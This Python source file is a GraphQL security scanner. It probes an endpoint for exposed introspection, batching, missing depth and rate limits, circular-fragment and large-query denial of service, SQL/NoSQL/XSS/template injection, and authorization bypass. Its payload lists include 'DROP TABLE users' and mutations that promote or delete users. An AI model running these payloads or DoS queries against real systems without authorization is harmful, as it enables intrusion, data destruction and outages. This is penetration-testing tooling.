"""
GraphQL Security Testing Wrapper

Comprehensive GraphQL security testing including:
- Introspection testing
- Batch query attacks
- Query depth and complexity attacks (DoS)
- Field suggestion enumeration
- Authorization bypass testing
- Injection testing (NoSQL, SQL)
- Rate limiting testing
- Subscription testing
"""
import sys
import argparse
import json
import re
import time
from pathlib import Path
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, field

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from utils.base_wrapper import APITool
from utils.output_parser import Finding, Severity


@dataclass
class GraphQLFinding:
    """Represents a GraphQL security finding"""
    test_type: str
    title: str
    description: str
    severity: str
    evidence: str = ""
    payload: str = ""
    response_preview: str = ""
    vulnerable: bool = False


class GraphQLTester(APITool):
    """Advanced GraphQL security testing wrapper."""

    # Full introspection query
    INTROSPECTION_QUERY = '''
    query IntrospectionQuery {
        __schema {
            queryType { name }
            mutationType { name }
            subscriptionType { name }
            types {
                kind
                name
                description
                fields(includeDeprecated: true) {
                    name
                    description
                    args {
                        name
                        description
                        type {
                            kind
                            name
                            ofType {
                                kind
                                name
                            }
                        }
                        defaultValue
                    }
                    type {
                        kind
                        name
                        ofType {
                            kind
                            name
                        }
                    }
                    isDeprecated
                    deprecationReason
                }
                inputFields {
                    name
                    type {
                        kind
                        name
                    }
                }
                interfaces {
                    name
                }
                enumValues(includeDeprecated: true) {
                    name
                    isDeprecated
                }
                possibleTypes {
                    name
                }
            }
            directives {
                name
                description
                locations
                args {
                    name
                    type {
                        kind
                        name
                    }
                }
            }
        }
    }
    '''

    # Injection payloads for GraphQL
    INJECTION_PAYLOADS = [
        # SQL Injection
        "' OR '1'='1",
        "' OR '1'='1' --",
        "1; DROP TABLE users--",
        "1 UNION SELECT 1,2,3--",
        # NoSQL Injection
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$where": "1==1"}',
        # Template Injection
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        # XSS payloads
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
    ]

    # Authorization bypass techniques
    AUTH_BYPASS_QUERIES = [
        # Direct object access
        '{ user(id: "1") { id email password } }',
        '{ user(id: 1) { id email password } }',
        '{ users { id email password } }',
        '{ allUsers { id email password } }',
        # Admin queries
        '{ admin { users { id email } } }',
        '{ adminUsers { id email role } }',
        # Mutations
        'mutation { updateUser(id: "1", role: "admin") { id role } }',
        'mutation { deleteUser(id: "1") { success } }',
        # Nested queries
        '{ user(id: "1") { posts { author { email } } } }',
    ]

    @property
    def tool_name(self) -> str:
        return "graphql_tester"

    def _build_target_args(self, target: str, **kwargs) -> List[str]:
        """GraphQL tester is pure Python - no CLI args needed."""
        return []

    def check_tool_installed(self) -> bool:
        """Override - this tool is pure Python."""
        try:
            import requests
            return True
        except ImportError:
            return False

    def run(self, target: str, output_file: str = None, **kwargs) -> Dict[str, Any]:
        """Run comprehensive GraphQL security tests."""
        from datetime import datetime
        import requests

        self.start_time = datetime.now()
        findings = []
        schema_data = None

        headers = kwargs.get('headers', {})
        if isinstance(headers, list):
            headers = dict(h.split(': ', 1) for h in headers if ': ' in h)
        headers.setdefault('Content-Type', 'application/json')

        test_types = kwargs.get('tests', 'all')
        timeout = kwargs.get('timeout', 30)

        print(f"[*] Testing GraphQL endpoint: {target}")

        # Run selected tests
        if test_types == 'all' or 'introspection' in test_types:
            print("\n[*] Testing introspection...")
            intro_findings, schema_data = self.test_introspection(target, headers, timeout)
            findings.extend(intro_findings)

        if test_types == 'all' or 'batch' in test_types:
            print("\n[*] Testing batch query support...")
            findings.extend(self.test_batch_queries(target, headers, timeout))

        if test_types == 'all' or 'depth' in test_types:
            print("\n[*] Testing query depth limits...")
            findings.extend(self.test_query_depth(target, headers, timeout))

        if test_types == 'all' or 'suggestions' in test_types:
            print("\n[*] Testing field suggestions...")
            findings.extend(self.test_field_suggestions(target, headers, timeout))

        if test_types == 'all' or 'dos' in test_types:
            print("\n[*] Testing DoS vulnerabilities...")
            findings.extend(self.test_dos_vectors(target, headers, timeout))

        if test_types == 'all' or 'injection' in test_types:
            print("\n[*] Testing for injection vulnerabilities...")
            findings.extend(self.test_injection(target, headers, timeout))

        if test_types == 'all' or 'auth' in test_types:
            print("\n[*] Testing authorization bypass...")
            findings.extend(self.test_auth_bypass(target, headers, timeout))

        if test_types == 'all' or 'rate' in test_types:
            print("\n[*] Testing rate limiting...")
            findings.extend(self.test_rate_limiting(target, headers, timeout))

        self.end_time = datetime.now()
        duration = (self.end_time - self.start_time).total_seconds()

        vulnerable_findings = [f for f in findings if f.vulnerable]

        # Save results
        if output_file is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = self.output_dir / f"graphql_test_{timestamp}.json"

        results_data = {
            'target': target,
            'duration': duration,
            'total_tests': len(findings),
            'vulnerabilities_found': len(vulnerable_findings),
            'findings': [
                {
                    'test_type': f.test_type,
                    'title': f.title,
                    'description': f.description,
                    'severity': f.severity,
                    'evidence': f.evidence,
                    'payload': f.payload,
                    'vulnerable': f.vulnerable
                }
                for f in findings
            ],
            'schema': schema_data
        }

        with open(output_file, 'w') as f:
            json.dump(results_data, f, indent=2)
        print(f"\n[+] Results saved to: {output_file}")

        return {
            'success': True,
            'tool': self.tool_name,
            'target': target,
            'duration': duration,
            'output_file': str(output_file),
            'results': findings,
            'schema': schema_data,
            'vulnerabilities_count': len(vulnerable_findings)
        }

    def test_introspection(self, url: str, headers: Dict, timeout: int) -> tuple:
        """Test if introspection is enabled."""
        import requests
        findings = []
        schema_data = None

        try:
            response = requests.post(
                url,
                json={'query': self.INTROSPECTION_QUERY},
                headers=headers,
                timeout=timeout,
                verify=False
            )

            if response.status_code == 200:
                data = response.json()
                if 'data' in data and '__schema' in data.get('data', {}):
                    schema_data = data['data']['__schema']

                    # Count types and analyze schema
                    types_count = len(schema_data.get('types', []))
                    query_type = schema_data.get('queryType', {}).get('name', 'N/A')
                    mutation_type = schema_data.get('mutationType', {})
                    subscription_type = schema_data.get('subscriptionType', {})

                    evidence = (
                        f"Found {types_count} types. "
                        f"Query: {query_type}, "
                        f"Mutation: {mutation_type.get('name', 'None')}, "
                        f"Subscription: {subscription_type.get('name', 'None') if subscription_type else 'None'}"
                    )

                    findings.append(GraphQLFinding(
                        test_type='introspection',
                        title='GraphQL Introspection Enabled',
                        description='Full GraphQL schema is exposed via introspection, allowing attackers to understand the entire API structure',
                        severity='medium',
                        evidence=evidence,
                        payload=self.INTROSPECTION_QUERY[:200] + '...',
                        vulnerable=True
                    ))
                    print(f"    [+] Introspection ENABLED - Found {types_count} types")

                    # Check for sensitive types
                    sensitive_types = self._find_sensitive_types(schema_data)
                    if sensitive_types:
                        findings.append(GraphQLFinding(
                            test_type='sensitive_types',
                            title='Sensitive Types Exposed in Schema',
                            description='Schema contains potentially sensitive type names',
                            severity='low',
                            evidence=f"Sensitive types found: {', '.join(sensitive_types[:10])}",
                            vulnerable=True
                        ))
                else:
                    print("    [-] Introspection appears disabled")
            else:
                print(f"    [-] Introspection query returned {response.status_code}")

        except Exception as e:
            print(f"    [!] Error: {e}")

        return findings, schema_data

    def _find_sensitive_types(self, schema: dict) -> List[str]:
        """Find potentially sensitive type names in schema."""
        sensitive_patterns = [
            'password', 'secret', 'token', 'key', 'auth', 'admin',
            'credential', 'private', 'internal', 'hash', 'salt'
        ]

        sensitive_found = []
        for type_def in schema.get('types', []):
            type_name = type_def.get('name', '').lower()
            for pattern in sensitive_patterns:
                if pattern in type_name and not type_name.startswith('__'):
                    sensitive_found.append(type_def.get('name'))
                    break

            # Check field names
            for field in type_def.get('fields', []) or []:
                field_name = field.get('name', '').lower()
                for pattern in sensitive_patterns:
                    if pattern in field_name:
                        sensitive_found.append(f"{type_def.get('name')}.{field.get('name')}")
                        break

        return list(set(sensitive_found))

    def test_batch_queries(self, url: str, headers: Dict, timeout: int) -> List[GraphQLFinding]:
        """Test for batch query support."""
        import requests
        findings = []

        # Test array-based batching
        batch_query = [
            {"query": "{ __typename }"},
            {"query": "{ __typename }"},
            {"query": "{ __typename }"}
        ]

        try:
            response = requests.post(
                url,
                json=batch_query,
                headers=headers,
                timeout=timeout,
                verify=False
            )

            if response.status_code == 200:
                try:
                    data = response.json()
                    if isinstance(data, list) and len(data) == 3:
                        findings.append(GraphQLFinding(
                            test_type='batch_query',
                            title='GraphQL Batch Queries Enabled',
                            description='Array-based batch queries are supported, which can be used for DoS or brute-force attacks',
                            severity='low',
                            evidence='Batch query with 3 requests returned 3 responses',
                            payload=str(batch_query),
                            vulnerable=True
                        ))
                        print("    [+] Batch queries ENABLED")
                except json.JSONDecodeError:
                    pass
        except Exception as e:
            print(f"    [!] Error: {e}")

        # Test aliased batching
        aliased_query = """
        {
            q1: __typename
            q2: __typename
            q3: __typename
            q4: __typename
            q5: __typename
        }
        """

        try:
            response = requests.post(
                url,
                json={'query': aliased_query},
                headers=headers,
                timeout=timeout,
                verify=False
            )

            if response.status_code == 200:
                data = response.json()
                if 'data' in data and len(data.get('data', {})) >= 5:
                    findings.append(GraphQLFinding(
                        test_type='aliased_batch',
                        title='GraphQL Aliased Queries Enabled',
                        description='Aliased queries allow multiple operations in single request',
                        severity='info',
                        evidence='Aliased query with 5 operations executed successfully',
                        vulnerable=True
                    ))
                    print("    [+] Aliased batching ENABLED")
        except Exception:
            pass

        return findings

    def test_query_depth(self, url: str, headers: Dict, timeout: int) -> List[GraphQLFinding]:
        """Test query depth limits."""
        import requests
        findings = []

        # Generate increasingly deep queries
        for depth in [5, 10, 15, 20]:
            nested = '{ __typename ' + ''.join([f'{{ __schema {{ types {{ name fields ' for _ in range(depth)]) + \
                     ''.join([' } } }' for _ in range(depth)]) + ' }'

            try:
                response = requests.post(
                    url,
                    json={'query': nested},
                    headers=headers,
                    timeout=min(timeout, 15),
                    verify=False
                )

                if response.status_code == 200:
                    if depth >= 15:
                        findings.append(GraphQLFinding(
                            test_type='query_depth',
                            title='No Query Depth Limit',
                            description=f'Queries with depth {depth}+ are allowed, enabling DoS attacks',
                            severity='medium',
                            evidence=f'Query with {depth} levels of nesting executed successfully',
                            vulnerable=True
                        ))
                        print(f"    [+] Deep queries allowed (depth: {depth})")
                        break
                else:
                    if depth >= 10:
                        print(f"    [-] Query blocked at depth {depth}")
                        break
            except requests.exceptions.Timeout:
                findings.append(GraphQLFinding(
                    test_type='query_timeout',
                    title='Query Caused Timeout',
                    description=f'Deep query at depth {depth} caused server timeout',
                    severity='medium',
                    evidence=f'Timeout at depth {depth}',
                    vulnerable=True
                ))
                break
            except Exception:
                break

        return findings

    def test_field_suggestions(self, url: str, headers: Dict, timeout: int) -> List[GraphQLFinding]:
        """Test if field suggestions leak schema information."""
        import requests
        findings = []

        typo_queries = [
            '{ __typname }',  # typo in __typename
            '{ user { namee } }',  # common field typo
            '{ users { emai } }',  # common field typo
            '{ querry }',  # typo
        ]

        for query in typo_queries:
            try:
                response = requests.post(
                    url,
                    json={'query': query},
                    headers=headers,
                    timeout=timeout,
                    verify=False
                )

                text = response.text.lower()
                if 'did you mean' in text or 'suggestion' in text:
                    findings.append(GraphQLFinding(
                        test_type='field_suggestions',
                        title='Field Suggestions Leak Schema Info',
                        description='GraphQL provides field suggestions on invalid queries, revealing schema structure',
                        severity='low',
                        evidence=response.text[:500],
                        payload=query,
                        vulnerable=True
                    ))
                    print("    [+] Field suggestions ENABLED")
                    break
            except Exception:
                continue

        return findings

    def test_dos_vectors(self, url: str, headers: Dict, timeout: int) -> List[GraphQLFinding]:
        """Test various DoS vectors."""
        import requests
        findings = []

        # Test circular fragment
        circular_query = """
        query {
            __typename
            ...A
        }
        fragment A on Query {
            __typename
            ...B
        }
        fragment B on Query {
            __typename
            ...A
        }
        """

        try:
            response = requests.post(
                url,
                json={'query': circular_query},
                headers=headers,
                timeout=min(timeout, 10),
                verify=False
            )

            if response.status_code == 200 and 'error' not in response.text.lower():
                findings.append(GraphQLFinding(
                    test_type='circular_fragment',
                    title='Circular Fragments Not Blocked',
                    description='Circular fragment references are allowed',
                    severity='medium',
                    evidence='Circular fragment query was processed',
                    payload=circular_query,
                    vulnerable=True
                ))
                print("    [+] Circular fragments NOT blocked")
        except requests.exceptions.Timeout:
            findings.append(GraphQLFinding(
                test_type='circular_fragment_dos',
                title='Circular Fragment Causes Timeout',
                description='Circular fragments cause server timeout - DoS vulnerability',
                severity='high',
                vulnerable=True
            ))
        except Exception:
            pass

        # Test large query
        large_query = '{ __typename ' + ''.join([f'a{i}: __typename ' for i in range(1000)]) + '}'

        try:
            start = time.time()
            response = requests.post(
                url,
                json={'query': large_query},
                headers=headers,
                timeout=min(timeout, 30),
                verify=False
            )
            elapsed = time.time() - start

            if response.status_code == 200 and elapsed > 5:
                findings.append(GraphQLFinding(
                    test_type='large_query',
                    title='Large Queries Cause Slow Response',
                    description=f'Query with 1000 fields took {elapsed:.2f}s',
                    severity='low',
                    evidence=f'Response time: {elapsed:.2f}s',
                    vulnerable=True
                ))
        except Exception:
            pass

        return findings

    def test_injection(self, url: str, headers: Dict, timeout: int) -> List[GraphQLFinding]:
        """Test for injection vulnerabilities."""
        import requests
        findings = []

        for payload in self.INJECTION_PAYLOADS[:5]:  # Limit payloads
            test_query = f'{{ user(id: "{payload}") {{ id }} }}'

            try:
                response = requests.post(
                    url,
                    json={'query': test_query},
                    headers=headers,
                    timeout=timeout,
                    verify=False
                )

                text = response.text.lower()
                error_indicators = [
                    'sql', 'syntax', 'mysql', 'postgresql', 'sqlite',
                    'mongodb', 'injection', 'unexpected', 'parse error'
                ]

                if any(ind in text for ind in error_indicators):
                    findings.append(GraphQLFinding(
                        test_type='injection',
                        title='Potential Injection Vulnerability',
                        description='Error message suggests potential injection point',
                        severity='high',
                        evidence=response.text[:500],
                        payload=payload,
                        vulnerable=True
                    ))
                    print(f"    [+] Potential injection with: {payload[:30]}...")
                    break

            except Exception:
                continue

        return findings

    def test_auth_bypass(self, url: str, headers: Dict, timeout: int) -> List[GraphQLFinding]:
        """Test authorization bypass queries."""
        import requests
        findings = []

        for query in self.AUTH_BYPASS_QUERIES[:5]:
            try:
                response = requests.post(
                    url,
                    json={'query': query},
                    headers=headers,
                    timeout=timeout,
                    verify=False
                )

                if response.status_code == 200:
                    data = response.json()
                    if 'data' in data and data['data'] is not None:
                        # Check if we got actual data
                        non_null_values = [v for v in data['data'].values() if v is not None]
                        if non_null_values:
                            findings.append(GraphQLFinding(
                                test_type='auth_bypass',
                                title='Potential Authorization Bypass',
                                description='Query returned data that may require authorization',
                                severity='high',
                                evidence=str(data)[:500],
                                payload=query,
                                vulnerable=True
                            ))
                            print(f"    [+] Auth bypass potential: {query[:50]}...")
                            break

            except Exception:
                continue

        return findings

    def test_rate_limiting(self, url: str, headers: Dict, timeout: int) -> List[GraphQLFinding]:
        """Test for rate limiting."""
        import requests
        findings = []

        query = '{ __typename }'
        request_count = 50
        success_count = 0
        start_time = time.time()

        for i in range(request_count):
            try:
                response = requests.post(
                    url,
                    json={'query': query},
                    headers=headers,
                    timeout=5,
                    verify=False
                )
                if response.status_code == 200:
                    success_count += 1
                elif response.status_code == 429:
                    print(f"    [-] Rate limited after {i} requests")
                    return findings
            except Exception:
                break

        elapsed = time.time() - start_time
        rps = success_count / elapsed if elapsed > 0 else 0

        if success_count == request_count:
            findings.append(GraphQLFinding(
                test_type='rate_limiting',
                title='No Rate Limiting Detected',
                description=f'Sent {request_count} requests in {elapsed:.2f}s ({rps:.1f} req/s) without rate limiting',
                severity='low',
                evidence=f'{success_count}/{request_count} requests succeeded',
                vulnerable=True
            ))
            print(f"    [+] No rate limiting ({rps:.1f} req/s)")

        return findings


def main():
    parser = argparse.ArgumentParser(
        description="GraphQL Security Tester - Comprehensive GraphQL vulnerability testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python graphql_tester.py -u https://example.com/graphql
  python graphql_tester.py -u https://example.com/api/graphql --tests introspection,batch
  python graphql_tester.py -u https://example.com/graphql -H "Authorization: Bearer token"
  python graphql_tester.py -u https://example.com/graphql --tests all -o results.json
        """
    )

    parser.add_argument("-u", "--url", required=True, help="GraphQL endpoint URL")
    parser.add_argument("-o", "--output", help="Output file (JSON)")
    parser.add_argument("-H", "--header", action="append", dest="headers",
                       help="HTTP headers (format: 'Name: Value')")
    parser.add_argument("--tests", default="all",
                       help="Tests to run: all, introspection, batch, depth, suggestions, dos, injection, auth, rate")
    parser.add_argument("-t", "--timeout", type=int, default=30,
                       help="Request timeout (default: 30)")

    args = parser.parse_args()

    tester = GraphQLTester()

    # Parse headers
    headers = {}
    if args.headers:
        for h in args.headers:
            if ': ' in h:
                name, value = h.split(': ', 1)
                headers[name] = value

    result = tester.run(
        target=args.url,
        output_file=args.output,
        headers=headers,
        tests=args.tests,
        timeout=args.timeout
    )

    if result['success']:
        vuln_findings = [f for f in result['results'] if f.vulnerable]
        print(f"\n{'='*60}")
        print(f"GraphQL Security Assessment Complete")
        print(f"{'='*60}")
        print(f"Total tests: {len(result['results'])}")
        print(f"Vulnerabilities: {len(vuln_findings)}")

        if vuln_findings:
            print("\n[!] Vulnerabilities Found:")
            for finding in vuln_findings:
                print(f"\n  [{finding.severity.upper()}] {finding.title}")
                print(f"  {finding.description}")
                if finding.evidence:
                    print(f"  Evidence: {finding.evidence[:200]}...")
    else:
        print(f"\n[-] Error: {result.get('error', 'Unknown error')}")

    return 0 if result['success'] else 1


if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    sys.exit(main())
